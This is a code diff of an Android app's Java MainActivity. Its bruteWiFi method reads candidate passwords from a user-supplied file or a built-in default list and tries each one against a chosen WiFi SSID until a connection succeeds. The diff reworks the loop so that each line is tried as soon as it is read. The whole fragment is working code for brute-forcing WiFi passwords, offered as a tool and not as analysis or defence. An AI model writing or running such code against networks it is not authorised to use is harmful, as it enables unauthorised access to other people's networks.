@@ -42,11 +42,15 @@ public class MainActivity extends AppCompatActivity {
 
     public void bruteWiFi(View view) {
         WifiManager wifi = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
+        wifi.setWifiEnabled(true);
+
         TextView errorView = (TextView) findViewById(R.id.errorV);
         EditText ssidEdit = (EditText) findViewById(R.id.ssid);
         EditText FilePathEdit = (EditText) findViewById(R.id.pathFile);
         EditText SpliterEdit = (EditText) findViewById(R.id.spliter);
+        String ssid = ssidEdit.getText().toString();
 
+        boolean res = false;
         String pathToFile = FilePathEdit.getText().toString();
         String spliter = SpliterEdit.getText().toString();
 
@@ -66,10 +70,10 @@ public class MainActivity extends AppCompatActivity {
                     data += line;
                 }
             } else {
-                spliter = "\n";
-                char ReadChar = ' ';
-                while ((ReadChar = (char)br.read()) != (char)-1) {
-                    data += (ReadChar);
+                while ((line = br.readLine()) != null) {
+                    res = connectToUnknown(wifi, ssid, line, true);
+                    if (res)
+                        return;
                 }
             }
             FilePassList = data.split(spliter);
@@ -81,9 +85,6 @@ public class MainActivity extends AppCompatActivity {
             errorView.append("Cant read file!\r\n");
 
         } finally {
-            wifi.setWifiEnabled(true);
-            String ssid = ssidEdit.getText().toString();
-            boolean res = false;
             if(readFromDefault) {
                 for (String i : DefaultPassList) {
                     res = connectToUnknown(wifi, ssid, i, true);
